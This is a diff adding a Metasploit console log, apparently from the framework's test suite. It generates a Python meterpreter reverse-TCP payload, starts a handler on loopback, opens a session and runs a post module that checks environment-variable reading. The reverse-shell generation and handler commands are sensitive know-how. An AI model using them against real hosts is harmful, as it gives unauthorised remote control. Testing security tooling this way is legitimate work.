@@ -1,0 +1,35 @@
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+[4mmsf6[0m [0m> loadpath test/modules
+Loaded 39 modules:
+    14 auxiliary modules
+    13 exploit modules
+    12 post modules
+[4mmsf6[0m [0m> use python/meterpreter_reverse_tcp
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-3889-efwgkytxt
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-python-meterpreter-reverse-tcp20231026-3889-g6nr9t.py -f raw AutoVerifySessionTimeout=30 lport=6001 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/pythonmeterpreter_reverse_tcp_debug_log20231026-3889-tqhebbtxt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+SessionTlvLogging => file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-3889-efwgkytxt
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> [*] Writing 24968 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-python-meterpreter-reverse-tcp20231026-3889-g6nr9t.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 0
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[-] Meterpreter session 1 is not valid and will be closed
+[*] 127.0.0.1 - Meterpreter session 1 closed.
+[*] Meterpreter session 2 opened (127.0.0.1:6001 -> 127.0.0.1:49670) at 2023-10-26 19:02:29 +0000
+use test/get_env
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> run session=2 AddEntropy=true Verbose=true
+[*] Running against session 2
+[*] Session type is meterpreter and platform is osx
+[+] should return user
+[+] should handle $ sign
+[+] should return multiple envs
+[*] Testing complete in 0.07 seconds
+[*] Passed: 3; Failed: 0; Skipped: 0
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 2 closed.
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> Stopping all jobs...
